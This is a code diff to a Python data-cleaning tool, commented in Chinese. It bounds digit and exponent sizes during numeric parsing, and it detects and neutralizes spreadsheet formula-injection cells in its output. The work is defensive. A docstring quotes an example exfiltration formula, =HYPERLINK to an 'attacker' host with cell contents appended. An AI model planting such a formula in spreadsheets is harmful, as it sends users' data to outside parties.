@@ -65,6 +65,18 @@ _GROUPED_RE = re.compile(r'[+-]?\d{1,3}(?:,\d{3})*(?:\.\d+)?(?:[eE][+-]?\d+)?$')
 # 十进制字面量, 拆成 整数系数 / 10^位数 做纯整数运算
 _DECIMAL_RE = re.compile(r'([+-]?)(\d+)(?:\.(\d+))?(?:[eE]([+-]?\d+))?$')
 
+# 数值解析的规模上界 (位数口径, 与数值大小无关)。两条理由是硬性的:
+#   1) 10**e 的开销随 e 线性增长, 而 e 来自单元格文本。'1e999999999' 只有 11 字节,
+#      却要算一个 4 亿位的整数 (实测单格卡死进程, >8s 不返回), 一份文件就能挂住清洗。
+#   2) CPython 3.11+ 拒绝 4300 位以上的 int<->str 转换, 位数越界会抛 ValueError ——
+#      异常一冒出去就不是"这一格保留原值", 而是整份文件失败 (实测连输出目录都没建)。
+#      _scaled_from 里的 str(whole) 与 _xlsx_safe_ints 里的 str() 都在这个界内。
+# 取 4000 是给单位因子(最大 10^12)与 zfill 留的余量, 真实金融数据离这个界有几十个
+# 数量级, 越界一律按解析失败处理 (保留原值 + 不猜), 与 1.234,5 这类歧义写法同一立场。
+_MAX_DIGITS = 4000
+# 指数本身的位数上限: 先卡长度, 保证下面的 int(exp) 不会踩到同一个 4300 位转换上限。
+_MAX_EXP_DIGITS = 4
+
 # 因子用 int, 整数路径全程精确 (不经过 float, 超过 2^53 也不丢精度)
 _UNIT_FACTORS = {'万亿': 10 ** 12, '千亿': 10 ** 11, '千万': 10 ** 7, '百万': 10 ** 6,
                  '十万': 10 ** 5, '亿': 10 ** 8, '万': 10 ** 4, '千': 10 ** 3}
@@ -113,7 +125,16 @@ def _numeric_core(value, convert_units=True):
         digits = digits[1:]
     elif digits[:1] == '+':
         digits = digits[1:]
-    if not _DECIMAL_RE.fullmatch(digits):
+    m = _DECIMAL_RE.fullmatch(digits)
+    if not m:
+        return None
+    int_part, frac_part, exp = m.group(2), m.group(3) or '', m.group(4) or ''
+    # 规模上界 (见 _MAX_DIGITS 处的理由): 越界按解析失败保留原值, 不能让一格文本
+    # 把进程挂住或把整份文件带崩。int_part + e 是结果整数的大致位数。
+    if len(exp) > _MAX_EXP_DIGITS or len(int_part) + len(frac_part) > _MAX_DIGITS:
+        return None
+    e = int(exp) if exp else 0
+    if abs(e) > _MAX_DIGITS or len(int_part) + e > _MAX_DIGITS:
         return None
     return negative, digits, factor
 
@@ -819,8 +840,62 @@ def _xlsx_safe_ints(df):
     return out
 
 
+# 会被 Excel 当公式求值的首字符 (CWE-1236): = 开头是公式, + - @ 开头 Excel 会自动
+# 补成公式, 制表/回车开头会被剥掉后再求值。
+_FORMULA_PREFIX = ('=', '+', '-', '@', '\t', '\r')
+
+
+def formula_risk_cells(df):
+    """返回 [(行下标, 列下标), ...]: 会被 Excel/WPS 当公式求值的文本格。
+
+    以 = 开头是公式表达式; + - @ 开头 Excel 会当公式补全; 制表/回车开头会被剥掉后
+    再求值 —— 这就是 CSV/公式注入 (CWE-1236)。本工具的输出是"用户自己刚洗过的数据",
+    可信度最高, 一个输入文件里的 =HYPERLINK("http://attacker/?"&A1) 只要被原样写出,
+    用户在 Excel 里打开就等于执行了攻击者的公式。
+
+    只扫对象/字符串列 (数值列不可能是公式); 命中列表为空是绝大多数情况。
+    """
+    hits = []
+    for j in range(df.shape[1]):
+        series = df.iloc[:, j]      # 按下标取: 列名重复时 df[col] 会给出 DataFrame,
+        if not (pd.api.types.is_object_dtype(series)   # 那样这一列就被静默漏掉了
+                or isinstance(series.dtype, pd.StringDtype)):
+            continue
+        try:
+            mask = series.str.startswith(_FORMULA_PREFIX, na=False)
+        except (AttributeError, TypeError):
+            # .str 只在"整列没有字符串"时拒绝 (内核数值化后就是 object 存 int,
+            # 这类列极常见): 整列既无字符串, 就不可能有公式。混合列照常工作 ——
+            # 实测 int+str / str+None / str+float 都能正确挑出载荷。
+            continue
+        if mask.any():
+            hits.extend((int(r), j) for r in mask.to_numpy().nonzero()[0])
+    return hits
+
+
+def _neutralize_formula_cells(out_path, df, risky_cells):
+    """把 openpyxl 写成公式的格子改回文本 (只在真有命中时才重写这一遍)。
+
+    置 data_type='s' 后 openpyxl 写出的是 <is><t>, 原文逐字保留 —— 不加前缀、
+    不改写数据, 只是不再作为公式被求值。
+
+    注意 quotePrefix 样式**挡不住**这个: 实测仍写出 <f> 节点 (那是给人看的显示属性,
+    不是存储类型), 必须显式改 data_type。
+    """
+    if not risky_cells:
+        return
+    import openpyxl                                 # 只有命中时才需要 (重写一遍代价不小)
+    wb = openpyxl.load_workbook(out_path)
+    ws = wb.active
+    for r, c in risky_cells:
+        cell = ws.cell(row=r + 2, column=c + 1)     # 第 1 行是表头 (to_excel index=False)
+        cell.value = df.iat[r, c]
+        cell.data_type = 's'
+    wb.save(out_path)
+
+
 def save_table(df, original_path, output_dir, stem=None, output_format='keep',
-               source_container=None):
+               source_container=None, risky_cells=None):
     """写出结果, 返回实际写出的路径列表 (第一个是主输出)。
 
     output_format:
@@ -836,6 +911,10 @@ def save_table(df, original_path, output_dir, stem=None, output_format='keep',
 
     stem: 显式指定输出主文件名 (不含 _cleaned 与扩展名), 用于批量模式下
     不同子目录同名文件的防冲突。
+
+    risky_cells: formula_risk_cells(df) 的结果, 省掉调用方算过一遍后再算一遍。
+    不传就自己算。xlsx 写出后据此把被 openpyxl 当成公式的格子改回文本 ——
+    传进来的下标必须对**写出的这个 df** 成立。
     """
     name = stem or os.path.splitext(os.path.basename(original_path))[0]
     ext = os.path.splitext(original_path)[1].lower()
@@ -850,11 +929,14 @@ def save_table(df, original_path, output_dir, stem=None, output_format='keep',
     else:
         targets = [fmt if fmt in ('xlsx', 'csv') else ('xlsx' if is_excel_src else 'csv')]
 
+    if risky_cells is None:
+        risky_cells = formula_risk_cells(df)
     written = []
     for target in targets:
         if target == 'xlsx':
             out_path = os.path.join(output_dir, f"{name}_cleaned.xlsx")
             _xlsx_safe_ints(df).to_excel(out_path, index=False, engine='openpyxl')
+            _neutralize_formula_cells(out_path, df, risky_cells)
         else:
             out_path = os.path.join(output_dir, f"{name}_cleaned.csv")
             df.to_csv(out_path, index=False, encoding='utf-8-sig')
@@ -1099,12 +1181,26 @@ def process_file(file_path, output_dir, config, progress=None):
     stem = (config.get('stem_map') or {}).get(os.path.abspath(file_path))
     if progress:
         progress(0.85, 'write')
+    # 公式注入: 只算一次, 交给 save_table 用来把 xlsx 里的公式格改回文本
+    risky = formula_risk_cells(df)
     out_paths = save_table(df, file_path, output_dir, stem,
                            config.get('output_format', 'keep'),
-                           source_container=meta.get('container'))
+                           source_container=meta.get('container'),
+                           risky_cells=risky)
     if progress:
         progress(1.0, 'save')
     report['warnings'].extend(meta.get('warnings') or [])
+    if risky:
+        # 清点实际写了哪些格式再说做了什么, 不能一律说"已按文本写入":
+        # csv 没有带内文本标记可用, 那一侧只能靠用户自己拿主意。
+        notes = []
+        if any(p.lower().endswith('.xlsx') for p in out_paths):
+            notes.append('xlsx 输出已按文本写入')
+        if any(p.lower().endswith('.csv') for p in out_paths):
+            notes.append('csv 没有带内文本标记, 打开前请确认来源可信')
+        report['warnings'].append(
+            f'{len(risky)} 个单元格以 = + - @ 开头, 在 Excel/WPS 里会被当公式求值'
+            + ('; ' + '; '.join(notes) if notes else ''))
     if len(out_paths) > 1:
         report['extra_outputs'] = out_paths[1:]
     if 'encoding' in meta:
